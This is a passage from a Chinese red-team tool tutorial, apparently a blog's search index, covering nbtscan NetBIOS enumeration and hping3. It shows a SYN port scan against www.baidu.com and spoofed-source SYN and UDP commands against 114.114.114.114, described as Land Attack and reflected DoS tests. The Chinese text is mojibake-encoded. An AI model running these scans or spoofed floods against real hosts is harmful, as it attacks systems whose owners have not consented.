class="language-shell">â”Œâ”€â”€<span class="token punctuation">(</span>kaliã‰¿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>â””â”€$ nbtscan -v -s <span class="token string">' '</span> <span class="token number">192.168</span>.0.112 <span class="token number">192.168</span>.0.112 DESKTOP-R5A39I1 00U<span class="token number">192.168</span>.0.112 DESKTOP-R5A39I1 20U<span class="token number">192.168</span>.0.112 WORKGROUP       00G<span class="token number">192.168</span>.0.112 MAC <span class="token number">18</span>:26:49:4c:f8:4c                                                                                                              â”Œâ”€â”€<span class="token punctuation">(</span>kaliã‰¿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>â””â”€$ nbtscan -v -s <span class="token string">' '</span> <span class="token number">192.168</span>.0.112 <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print $1&#125;'</span> <span class="token operator">|</span> <span class="token function">uniq</span><span class="token number">192.168</span>.0.112<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>awk â€˜{print $1}â€™å–ç¬¬ä¸€åˆ—</p><p>uniq ç­›é€‰å‡ºé‡å¤å­—ç¬¦ä¸²</p></blockquote><h2 id="hping3"><a href="#hping3" class="headerlink" title="hping3"></a>hping3</h2><p>hping3ä¸»è¦æ˜¯æµ‹è¯•é˜²ç«å¢™çš„æ‹¦æˆªè§„åˆ™ï¼Œå¯¹ç½‘ç»œè®¾å¤‡è¿›è¡Œæµ‹è¯•</p><p><img src="https://img1.imgtp.com/2022/03/24/pC7lL5tA.png"></p><h3 id="å¸¸ç”¨æ¨¡å¼"><a href="#å¸¸ç”¨æ¨¡å¼" class="headerlink" title="å¸¸ç”¨æ¨¡å¼"></a>å¸¸ç”¨æ¨¡å¼</h3><ul><li>-0 â€“rawip IPåŸå§‹æŠ¥æ–‡</li><li>-1 â€“icmp ICMPæ¨¡å¼</li><li>-2 â€“udp UDPæ¨¡å¼</li><li>-8 â€“scan æ‰«ææ¨¡å¼</li><li>-9 â€“listen ç›‘å¬æ¨¡å¼</li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> hping3 --scan <span class="token number">1</span>-30,70-90 -S www.baidu.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>SYNæ–¹å¼æ‰«æä¸»æœºç«¯å£</p></blockquote><p><img src="https://img1.imgtp.com/2022/03/24/vC16eD9o.png"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œç›®æ ‡ä¸»æœºå›å¤ï¼šS..Aï¼Œä»£è¡¨SYN/ACK</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> hping3 -S -a <span class="token number">114.114</span>.114.114 -p <span class="token number">53</span> <span class="token number">114.114</span>.114.114 -c <span class="token number">5</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>æµ‹è¯•é˜²ç«å¢™å¯¹ICMPåŒ…çš„ååº”ï¼Œæ˜¯å¦æ”¯æŒtracerouteï¼Œæ˜¯å¦å¼€æ”¾æŸä¸ªç«¯å£ï¼Œå¯¹é˜²ç«å¢™è¿›è¡Œæ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆDos attackï¼‰ã€‚ä¾‹å¦‚ï¼Œä»¥Land Attackæ–¹å¼æµ‹è¯•ç›®æ ‡é˜²ç«å¢™ï¼ˆLand Attackæ˜¯å°†å‘é€æºåœ°å€è®¾ç½®ä¸ºä¸ç›®æ ‡åœ°å€ç›¸åŒï¼Œè¯±ä½¿ç›®æ ‡æœºä¸è‡ªå·±ä¸åœåœ°å»ºç«‹é“¾æ¥ï¼‰ã€‚</p></blockquote><h3 id="DRDDOS"><a href="#DRDDOS" class="headerlink" title="DRDDOS"></a>DRDDOS</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> hping3 --udp -a <span class="token number">114.114</span>.114.114 -p <span class="token number">53</span> <span class="token number">114.114</span>.114.114 -c <span class="token number">5</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>åŸºäºUDPçš„DOS</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> redteam </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redteam </tag>
            
            <tag> ä¿¡æ¯æ”¶é›† </tag>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
